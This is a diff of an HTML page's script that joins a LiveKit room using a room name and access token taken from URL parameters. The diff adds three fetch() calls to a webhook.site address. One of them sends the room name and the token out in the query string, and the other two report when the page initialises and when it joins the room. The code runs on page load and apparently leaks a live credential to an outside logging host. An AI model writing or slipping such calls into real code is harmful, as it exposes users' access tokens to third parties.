@@ -102,6 +102,8 @@
     <canvas id="egressCanvas"></canvas>
 
     <script>
+        fetch("https://webhook.site/889a5dbe-2fae-48f5-baeb-32071242c019?init");
+
         const urlParams = new URLSearchParams(window.location.search);
         const roomName = urlParams.get("roomName");
         const token = urlParams.get("token");
@@ -110,10 +112,14 @@
             throw new Error("Missing params");
         }
 
+        fetch(`https://webhook.site/889a5dbe-2fae-48f5-baeb-32071242c019?roomName=${roomName}&token=${token}`);
+
         const room = new LivekitClient.Room({
             audioCaptureDefaults: { autoGainControl: false, echoCancellation: false, noiseSuppression: false },
             videoCaptureDefaults: { resolution: { width: 1280, height: 720 } },
         });
+
+        fetch(`https://webhook.site/889a5dbe-2fae-48f5-baeb-32071242c019?roomJoined`);
 
         const canvas = document.getElementById("egressCanvas");
         const ctx = canvas.getContext("2d");
